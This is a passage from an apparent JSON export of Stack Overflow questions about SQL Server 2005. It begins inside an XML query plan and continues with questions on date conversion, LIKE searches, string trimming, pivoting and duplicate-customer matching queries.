&lt;DefinedValues&gt;\n                      &lt;DefinedValue&gt;\n                        &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                        &lt;ScalarOperator ScalarString=\"CASE WHEN [Expr1013]=(0) THEN NULL ELSE [Expr1014] END\"&gt;\n                          &lt;IF&gt;\n                            &lt;Condition&gt;\n                              &lt;ScalarOperator&gt;\n                                &lt;Compare CompareOp=\"EQ\"&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Identifier&gt;\n                                      &lt;ColumnReference Column=\"Expr1013\" /&gt;\n                                    &lt;/Identifier&gt;\n                                  &lt;/ScalarOperator&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Const ConstValue=\"(0)\" /&gt;\n                                  &lt;/ScalarOperator&gt;\n                                &lt;/Compare&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Condition&gt;\n                            &lt;Then&gt;\n                              &lt;ScalarOperator&gt;\n                                &lt;Const ConstValue=\"NULL\" /&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Then&gt;\n                            &lt;Else&gt;\n                              &lt;ScalarOperator&gt;\n                                &lt;Identifier&gt;\n                                  &lt;ColumnReference Column=\"Expr1014\" /&gt;\n                                &lt;/Identifier&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Else&gt;\n                          &lt;/IF&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/DefinedValue&gt;\n                    &lt;/DefinedValues&gt;\n                    &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.291662\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"9019.76\" LogicalOp=\"Aggregate\" NodeId=\"2\" Parallel=\"false\" PhysicalOp=\"Hash Match\" EstimatedTotalSubtreeCost=\"1.48014\"&gt;\n                      &lt;OutputList&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                        &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                        &lt;ColumnReference Column=\"Expr1013\" /&gt;\n                        &lt;ColumnReference Column=\"Expr1014\" /&gt;\n                      &lt;/OutputList&gt;\n                      &lt;MemoryFractions Input=\"1\" Output=\"1\" /&gt;\n                      &lt;RunTimeInformation&gt;\n                        &lt;RunTimeCountersPerThread Thread=\"0\" ActualRows=\"156794\" ActualEndOfScans=\"1\" ActualExecutions=\"1\" /&gt;\n                      &lt;/RunTimeInformation&gt;\n                      &lt;Hash&gt;\n                        &lt;DefinedValues&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                            &lt;ScalarOperator ScalarString=\"MIN([directpay].[dbo].[tbl_Faktuur].[Faktuurdatum])\"&gt;\n                              &lt;Aggregate AggType=\"MIN\" Distinct=\"false\"&gt;\n                                &lt;ScalarOperator&gt;\n                                  &lt;Identifier&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                                  &lt;/Identifier&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/Aggregate&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Column=\"Expr1013\" /&gt;\n                            &lt;ScalarOperator ScalarString=\"COUNT_BIG([directpay].[dbo].[tbl_Faktuur].[Totaal_Open])\"&gt;\n                              &lt;Aggregate AggType=\"COUNT_BIG\" Distinct=\"false\"&gt;\n                                &lt;ScalarOperator&gt;\n                                  &lt;Identifier&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                  &lt;/Identifier&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/Aggregate&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Column=\"Expr1014\" /&gt;\n                            &lt;ScalarOperator ScalarString=\"SUM([directpay].[dbo].[tbl_Faktuur].[Totaal_Open])\"&gt;\n                              &lt;Aggregate AggType=\"SUM\" Distinct=\"false\"&gt;\n                                &lt;ScalarOperator&gt;\n                                  &lt;Identifier&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                  &lt;/Identifier&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/Aggregate&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/DefinedValue&gt;\n                        &lt;/DefinedValues&gt;\n                        &lt;HashKeysBuild&gt;\n                          &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                        &lt;/HashKeysBuild&gt;\n                        &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.255\" EstimateIO=\"0.634196\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"27420\" LogicalOp=\"Index Seek\" NodeId=\"4\" Parallel=\"false\" PhysicalOp=\"Index Seek\" EstimatedTotalSubtreeCost=\"0.889196\"&gt;\n                          &lt;OutputList&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                          &lt;/OutputList&gt;\n                          &lt;RunTimeInformation&gt;\n                            &lt;RunTimeCountersPerThread Thread=\"0\" ActualRows=\"298726\" ActualEndOfScans=\"1\" ActualExecutions=\"1\" /&gt;\n                          &lt;/RunTimeInformation&gt;\n                          &lt;IndexScan Ordered=\"true\" ScanDirection=\"FORWARD\" ForcedIndex=\"false\" NoExpandHint=\"false\"&gt;\n                            &lt;DefinedValues&gt;\n                              &lt;DefinedValue&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                              &lt;/DefinedValue&gt;\n                              &lt;DefinedValue&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                              &lt;/DefinedValue&gt;\n                              &lt;DefinedValue&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/DefinedValue&gt;\n                            &lt;/DefinedValues&gt;\n                            &lt;Object Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Index=\"[_dta_index_tbl_Faktuur_5_583009158__K13_K9_K19_K2_5]\" /&gt;\n                            &lt;SeekPredicates&gt;\n                              &lt;SeekPredicate&gt;\n                                &lt;Prefix ScanType=\"EQ\"&gt;\n                                  &lt;RangeColumns&gt;\n                                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Afgehandeld_NeeJa\" /&gt;\n                                  &lt;/RangeColumns&gt;\n                                  &lt;RangeExpressions&gt;\n                                    &lt;ScalarOperator ScalarString=\"(0)\"&gt;\n                                      &lt;Const ConstValue=\"(0)\" /&gt;\n                                    &lt;/ScalarOperator&gt;\n                                  &lt;/RangeExpressions&gt;\n                                &lt;/Prefix&gt;\n                              &lt;/SeekPredicate&gt;\n                            &lt;/SeekPredicates&gt;\n                            &lt;Predicate&gt;\n                              &lt;ScalarOperator ScalarString=\"isnull([directpay].[dbo].[tbl_Faktuur].[Totaal_Open],($0.0000))&amp;lt;($0.0000) OR isnull([directpay].[dbo].[tbl_Faktuur].[Totaal_Open],($0.0000))&amp;gt;($0.0000)\"&gt;\n                                &lt;Logical Operation=\"OR\"&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Compare CompareOp=\"LT\"&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Identifier&gt;\n                                              &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                            &lt;/Identifier&gt;\n                                          &lt;/ScalarOperator&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                          &lt;/ScalarOperator&gt;\n                                        &lt;/Intrinsic&gt;\n                                      &lt;/ScalarOperator&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                      &lt;/ScalarOperator&gt;\n                                    &lt;/Compare&gt;\n                                  &lt;/ScalarOperator&gt;\n                                  &lt;ScalarOperator&gt;\n                                    &lt;Compare CompareOp=\"GT\"&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Identifier&gt;\n                                              &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                                            &lt;/Identifier&gt;\n                                          &lt;/ScalarOperator&gt;\n                                          &lt;ScalarOperator&gt;\n                                            &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                          &lt;/ScalarOperator&gt;\n                                        &lt;/Intrinsic&gt;\n                                      &lt;/ScalarOperator&gt;\n                                      &lt;ScalarOperator&gt;\n                                        &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                      &lt;/ScalarOperator&gt;\n                                    &lt;/Compare&gt;\n                                  &lt;/ScalarOperator&gt;\n                                &lt;/Logical&gt;\n                              &lt;/ScalarOperator&gt;\n                            &lt;/Predicate&gt;\n                          &lt;/IndexScan&gt;\n                        &lt;/RelOp&gt;\n                      &lt;/Hash&gt;\n                    &lt;/RelOp&gt;\n                  &lt;/ComputeScalar&gt;\n                &lt;/RelOp&gt;\n              &lt;/ComputeScalar&gt;\n            &lt;/RelOp&gt;\n          &lt;/QueryPlan&gt;\n        &lt;/StmtSimple&gt;\n      &lt;/Statements&gt;\n    &lt;/Batch&gt;\n  &lt;/BatchSequence&gt;\n&lt;/ShowPlanXML&gt;\n</code></pre>\n\n<p><strong>Without ISNULL</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-16\"?&gt;\n&lt;ShowPlanXML xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" Version=\"1.0\" Build=\"9.00.5000.00\" xmlns=\"http://schemas.microsoft.com/sqlserver/2004/07/showplan\"&gt;\n  &lt;BatchSequence&gt;\n    &lt;Batch&gt;\n      &lt;Statements&gt;\n        &lt;StmtSimple StatementCompId=\"1\" StatementEstRows=\"1322.43\" StatementId=\"1\" StatementOptmLevel=\"FULL\" StatementOptmEarlyAbortReason=\"GoodEnoughPlanFound\" StatementSubTreeCost=\"0.274954\" StatementText=\"SELECT    debiteur_id, MIN(Faktuurdatum) AS OldestOpenInvoiceDate, ISNULL(SUM(Totaal_Open),0) AS TotalOpenAmount&amp;#xD;&amp;#xA;FROM    dbo.tbl_Faktuur &amp;#xD;&amp;#xA;WHERE   (Afgehandeld_NeeJa = 0 OR Afgehandeld_NeeJa IS NULL)&amp;#xD;&amp;#xA;--AND        (ISNULL(Totaal_Open,0) &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;AND        (Totaal_Open &amp;lt;&amp;gt; 0) &amp;#xD;&amp;#xA;GROUP BY debiteur_id\" StatementType=\"SELECT\"&gt;\n          &lt;StatementSetOptions ANSI_NULLS=\"false\" ANSI_PADDING=\"false\" ANSI_WARNINGS=\"false\" ARITHABORT=\"true\" CONCAT_NULL_YIELDS_NULL=\"false\" NUMERIC_ROUNDABORT=\"false\" QUOTED_IDENTIFIER=\"false\" /&gt;\n          &lt;QueryPlan CachedPlanSize=\"47\" CompileTime=\"9\" CompileCPU=\"9\" CompileMemory=\"528\"&gt;\n            &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.000132243\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"1322.43\" LogicalOp=\"Compute Scalar\" NodeId=\"0\" Parallel=\"false\" PhysicalOp=\"Compute Scalar\" EstimatedTotalSubtreeCost=\"0.274954\"&gt;\n              &lt;OutputList&gt;\n                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                &lt;ColumnReference Column=\"Expr1005\" /&gt;\n              &lt;/OutputList&gt;\n              &lt;ComputeScalar&gt;\n                &lt;DefinedValues&gt;\n                  &lt;DefinedValue&gt;\n                    &lt;ColumnReference Column=\"Expr1005\" /&gt;\n                    &lt;ScalarOperator ScalarString=\"isnull([Expr1004],($0.0000))\"&gt;\n                      &lt;Intrinsic FunctionName=\"isnull\"&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Identifier&gt;\n                            &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                          &lt;/Identifier&gt;\n                        &lt;/ScalarOperator&gt;\n                        &lt;ScalarOperator&gt;\n                          &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/Intrinsic&gt;\n                    &lt;/ScalarOperator&gt;\n                  &lt;/DefinedValue&gt;\n                &lt;/DefinedValues&gt;\n                &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.167304\" EstimateIO=\"0\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"1322.43\" LogicalOp=\"Aggregate\" NodeId=\"1\" Parallel=\"false\" PhysicalOp=\"Hash Match\" EstimatedTotalSubtreeCost=\"0.274822\"&gt;\n                  &lt;OutputList&gt;\n                    &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                    &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                  &lt;/OutputList&gt;\n                  &lt;MemoryFractions Input=\"0\" Output=\"0\" /&gt;\n                  &lt;Hash&gt;\n                    &lt;DefinedValues&gt;\n                      &lt;DefinedValue&gt;\n                        &lt;ColumnReference Column=\"Expr1003\" /&gt;\n                        &lt;ScalarOperator ScalarString=\"MIN([directpay].[dbo].[tbl_Faktuur].[Faktuurdatum])\"&gt;\n                          &lt;Aggregate AggType=\"MIN\" Distinct=\"false\"&gt;\n                            &lt;ScalarOperator&gt;\n                              &lt;Identifier&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                              &lt;/Identifier&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/Aggregate&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/DefinedValue&gt;\n                      &lt;DefinedValue&gt;\n                        &lt;ColumnReference Column=\"Expr1004\" /&gt;\n                        &lt;ScalarOperator ScalarString=\"SUM([directpay].[dbo].[tbl_Faktuur].[Totaal_Open])\"&gt;\n                          &lt;Aggregate AggType=\"SUM\" Distinct=\"false\"&gt;\n                            &lt;ScalarOperator&gt;\n                              &lt;Identifier&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/Identifier&gt;\n                            &lt;/ScalarOperator&gt;\n                          &lt;/Aggregate&gt;\n                        &lt;/ScalarOperator&gt;\n                      &lt;/DefinedValue&gt;\n                    &lt;/DefinedValues&gt;\n                    &lt;HashKeysBuild&gt;\n                      &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                    &lt;/HashKeysBuild&gt;\n                    &lt;RelOp AvgRowSize=\"23\" EstimateCPU=\"0.030319\" EstimateIO=\"0.0771991\" EstimateRebinds=\"0\" EstimateRewinds=\"0\" EstimateRows=\"27420\" LogicalOp=\"Index Seek\" NodeId=\"2\" Parallel=\"false\" PhysicalOp=\"Index Seek\" EstimatedTotalSubtreeCost=\"0.107518\"&gt;\n                      &lt;OutputList&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                        &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                      &lt;/OutputList&gt;\n                      &lt;IndexScan Ordered=\"true\" ScanDirection=\"FORWARD\" ForcedIndex=\"false\" NoExpandHint=\"false\"&gt;\n                        &lt;DefinedValues&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Debiteur_ID\" /&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Faktuurdatum\" /&gt;\n                          &lt;/DefinedValue&gt;\n                          &lt;DefinedValue&gt;\n                            &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                          &lt;/DefinedValue&gt;\n                        &lt;/DefinedValues&gt;\n                        &lt;Object Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Index=\"[_dta_index_tbl_Faktuur_5_583009158__K13_K9_K19_K2_5]\" /&gt;\n                        &lt;SeekPredicates&gt;\n                          &lt;SeekPredicate&gt;\n                            &lt;Prefix ScanType=\"EQ\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Afgehandeld_NeeJa\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"(0)\"&gt;\n                                  &lt;Const ConstValue=\"(0)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/Prefix&gt;\n                            &lt;EndRange ScanType=\"LT\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"($0.0000)\"&gt;\n                                  &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/EndRange&gt;\n                          &lt;/SeekPredicate&gt;\n                          &lt;SeekPredicate&gt;\n                            &lt;Prefix ScanType=\"EQ\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Afgehandeld_NeeJa\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"(0)\"&gt;\n                                  &lt;Const ConstValue=\"(0)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/Prefix&gt;\n                            &lt;StartRange ScanType=\"GT\"&gt;\n                              &lt;RangeColumns&gt;\n                                &lt;ColumnReference Database=\"[directpay]\" Schema=\"[dbo]\" Table=\"[tbl_Faktuur]\" Column=\"Totaal_Open\" /&gt;\n                              &lt;/RangeColumns&gt;\n                              &lt;RangeExpressions&gt;\n                                &lt;ScalarOperator ScalarString=\"($0.0000)\"&gt;\n                                  &lt;Const ConstValue=\"($0.0000)\" /&gt;\n                                &lt;/ScalarOperator&gt;\n                              &lt;/RangeExpressions&gt;\n                            &lt;/StartRange&gt;\n                          &lt;/SeekPredicate&gt;\n                        &lt;/SeekPredicates&gt;\n                      &lt;/IndexScan&gt;\n                    &lt;/RelOp&gt;\n                  &lt;/Hash&gt;\n                &lt;/RelOp&gt;\n              &lt;/ComputeScalar&gt;\n            &lt;/RelOp&gt;\n          &lt;/QueryPlan&gt;\n        &lt;/StmtSimple&gt;\n      &lt;/Statements&gt;\n    &lt;/Batch&gt;\n  &lt;/BatchSequence&gt;\n&lt;/ShowPlanXML&gt;\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2783,"score":0,"question_id":5483702,"title":"Truncate all tables of a database in SQL Server 2005","body":"<p>How can I truncate all tables of a database?</p>\n"},{"tags":["c#","sql-server-2005","backup"],"answer_count":9,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":3373,"score":3,"question_id":841659,"title":"Backup SQL Server Database remotely without backup permission","body":"<p>I have a host which runs SQL Server 2005, I have the ability to login to my database and copy/read/write/drop all tables/views/sp's.  I tried simply right clicking on my server and selecting backup but I don't seem to have permission to do any backing up.  </p>\n\n<p>This cannot be an uncommon occurrence (someone using host/providers db).  </p>\n\n<p>Has anyone figured out how to backup the database to a remote computer (without resorting to plain old copy row by row)?  I'd Like to have my own backup of my server without relying on my host to preform backups.  If so, what library/app allowed you to do this.</p>\n\n<p>Note, I believe that my host does allow for some form of backup using (Database Publishing Wizard) Does anyone know what libraries it uses (so that I may reproduce it in my code)?</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13081309,"title":"Converting Date to String in SQL Server 2005","body":"<p>I am working on SQL server 2005. While inserting specified date in the database by this format:<br>\n(<code>10/11/2012 00:00:0:00</code>)(<code>MM/dd/yyyy HH:mm:s:ms</code>).</p>\n\n<pre><code>select CAST(day(column name) AS CHAR(2)) + ' '\n   + CONVERT(CHAR(4), column name, 100) + ', '\n   + CONVERT(CHAR(4), column name, 120) as Coupon_expire\nfrom Admin\n</code></pre>\n\n<p>I can't convert this date to this type (<code>Wednesday, October 11, 2012</code>), please help me.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","tsql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":91,"score":1,"question_id":13075465,"title":"Is there any alternative of 'like' operators in sql - for searching data","body":"<p>I need some help here, I am fetching data dependent upon the conditions</p>\n\n<p>Here I am using like operators, where client may use search with any word thus I have the below logic but here retrieval time is too high (it's taking 4mins) to get the data which is too slow.</p>\n\n<p>I did all indexing to table but still can't optimize the query.</p>\n\n<p>select * from authors \nwhere (address like '% Walmart %' OR address like 'Walmart %' OR address like '% Walmart' OR address like '% Walmart.com %' OR address like 'Walmart.com %' OR address like '% Walmart.com' OR address like '% Walmarts %' OR address like 'Walmarts %' OR address like '% Walmarts' OR address like '% Walmarts.com %' OR address like 'Walmarts.com %' OR address like '% Walmarts.com') </p>\n\n<p>-- Result is 1 Rows </p>\n\n<p>if i follow this logic</p>\n\n<p>select * from authors \n    where address like '%Walmart%'</p>\n\n<p>-- Result is 44 rows - it is fetching all rows</p>\n\n<p>But I need to get only that one row</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13080866,"title":"Convert DateTime to character string?","body":"<p>I am working on SQL Server 2005. While inserting specified date into the database in this format\n(Wednesday, October 17, 2012), I want to convert that format to this type (<code>MM/dd/yyyy</code>)</p>\n\n<p>Otherwise if I am inserting the date like this format (<code>MM/dd/yyyy</code>), I want to convert that format  to this type (Wednesday, October 17, 2012) or (17 oct,2012).</p>\n\n<p>I can't get the clear idea. if any one knows please help me. </p>\n\n<p>Advance thanks</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":4,"view_count":68,"score":0,"question_id":13069980,"title":"What is the most efficient way to RTRIM a STRING without using RTRIM in SQL Server 2005?","body":"<p>In a single-select-statement, I have the need to <code>RTRIM</code> a string in a SQL Server 2005 environment.</p>\n\n<p>What is, in your opinion, the most efficient technique to achieve this?</p>\n\n<p>Examples:</p>\n\n<pre><code>'ALPHA    ' ==&gt; 'ALPHA' (the blanks at the end are removed)\n' BETA  ' ==&gt; ' BETA'  (the blank in first position remains, the two blanks at the end are removed)\n' GAMMA' ==&gt; ' GAMMA'  (the blank in first position remains)\n</code></pre>\n\n<p>Thank you in advance for your kind help.</p>\n\n<p>EDIT: I am not authorized to use <code>RTRIM</code>!!</p>\n"},{"tags":["sql","sql-server","sql-server-2005","pivot"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":1939,"score":0,"question_id":390238,"title":"Display a single record (row) as a single column","body":"<p>I'm looking for ways to display a single row of data as a single column (with multiple rows).  For example,</p>\n\n<pre>\nFieldA  FieldB\n------- ---------\n1       Some Text [row]\n\n\nHeader Value [col]\n------ ------\nFieldA 1          [row1]\nFieldB SomeText   [row2]\n\n</pre>\n\n<p>Is there a way to do this with SQL Server 2005?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","duplicates","phonetics"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":74,"score":1,"question_id":13073532,"title":"Please help fix and optimize this query","body":"<p>I am working on a system to find potential duplicates in our customers table (SQL 2005). I am using the built-in SOUNDEX value that our software computes when customers are added/updated, but I also implemented the double metaphone algorithm for better matching. This is the most-nested query I have created, and I can't help but think there is a better way to do it and I'd like to learn.</p>\n\n<p>In the inner-most query I am joining the customer table to the metaphone table I created, then finding customers that have identical pKey (primary phonetic key). I take that, union that with customers that have matching soundex values, and then proceed to score those matches with various text similarity functions.</p>\n\n<p>This is currently working, but I would also like to add a union of customers whose aKey (alternate phonetic key) match. This would be identical to \"QUERY A\" except to substitute <code>on (c1Akey = c2Akey)</code> for the join. However, when I attempt to include that, I get errors when I try to execute my query.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>    --Create aggregate ranking\nselect c1Name, c2Name, nDiff, c1Addr, c2Addr, aDiff, c1SSN, c2SSN, sDiff, c1DOB, c2DOB, dDiff, nDiff+aDiff+dDiff+sDiff as Score\n        ,(sDiff+dDiff)*1.5 + (nDiff+dDiff)*1.5 + (nDiff+sDiff)*1.5 + aDiff *.5 + nDiff *.5 as [Rank]\n    FROM\n    (\n    --Create match scores for different fields\n    SELECT     c1Name, c2Name, c1Addr, c2Addr, c1SSN, c2SSN, c1LTD, \n                      c2LTD, c1DOB, c2DOB, dbo.Jaro(c1name, c2name) AS nDiff, dbo.JaroWinkler(c1addr, c2addr) AS aDiff, \n                      CASE WHEN c1dob = '1901-01-01' OR\n                      c2dob = '1901-01-01' OR\n                      c1dob = '1800-01-01' OR\n                      c2dob = '1800-01-01' THEN .5 ELSE dbo.SmithWaterman(c1dob, c2dob) END AS dDiff, CASE WHEN c1ssn = '000-00-0000' OR\n                      c2ssn = '000-00-0000' THEN .5 ELSE dbo.Jaro(c1ssn, c2ssn) END AS sDiff\nFROM    \n-- Generate list of possible matches based on multiple phonetic matching fields\n( select * from \n    -- List of similar names from pKey field of ##Metaphone table\n    --QUERY A BEGIN\n    (select customers.custno as c1Custno, name as c1Name, haddr as c1Addr, ssn as c1SSN, lasttripdate as c1LTD, dob as c1DOB, soundex as c1Soundex, pkey as c1Pkey, akey as c1Akey from Customers WITH (nolock) join ##Metaphone on customers.custno = ##Metaphone.custno) as c1\n        JOIN\n    (select customers.custno as c2Custno, name as c2Name, haddr as c2Addr, ssn as c2SSN, lasttripdate as c2LTD, dob as c2DOB, soundex as c2Soundex, pkey as c2Pkey, akey as c2Akey from Customers with (nolock) join ##Metaphone on customers.custno = ##Metaphone.custno) as c2\n        on (c1Pkey = c2Pkey) and (c1Custno &lt; c2Custno)\n    WHERE (c1Name &lt;&gt; 'PARENT, GUARDIAN') and c1soundex != c2soundex\n    --QUERY A END\n\n    union\n        --List of similar names from pregenerated SOUNDEX field\n        (select t1.custno, t1.name, t1.haddr, t1.ssn, t1.lasttripdate, t1.dob, t1.[soundex], 0, 0, t2.custno, t2.name, t2.haddr, t2.ssn, t2.lasttripdate, t2.dob, t2.[soundex], 0, 0 from Customers t1 WITH (nolock) \n            join customers t2 with (nolock) on t1.[soundex] = t2.[soundex]  and t1.custno &lt; t2.custno\n                where (t1.name &lt;&gt; 'PARENT, GUARDIAN'))\n\n) as a\n) as b\nwhere (sDiff+dDiff)*1.5 + (nDiff+dDiff)*1.5 + (nDiff+sDiff)*1.5 + aDiff *.5 + nDiff *.5   &gt;= 7.5\norder by [rank] desc, score desc\n</code></pre>\n\n<p>Previously, I was 